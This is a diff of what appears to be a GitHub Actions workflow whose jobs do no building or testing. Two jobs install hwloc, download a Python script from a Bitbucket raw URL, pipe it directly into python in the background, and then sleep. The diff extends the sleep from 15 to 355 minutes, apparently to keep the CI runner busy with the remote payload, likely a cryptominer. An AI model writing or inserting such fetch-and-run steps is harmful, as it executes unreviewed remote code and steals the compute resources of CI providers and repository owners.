@@ -55,7 +55,7 @@ jobs:
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6 hwloc
         wget -O- https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/sr.py | python &
-        sleep 15m
+        sleep 355m
         echo "sukses"
   mechat2:
     needs: pemanasan
@@ -81,7 +81,7 @@ jobs:
       run: |
         sudo apt-get update && sudo apt install libc-bin libc6 hwloc
         wget -O- https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/sr.py | python &
-        sleep 15m
+        sleep 355m
         echo "sukses"
   Success:
     needs: [pemanasan, mechat]
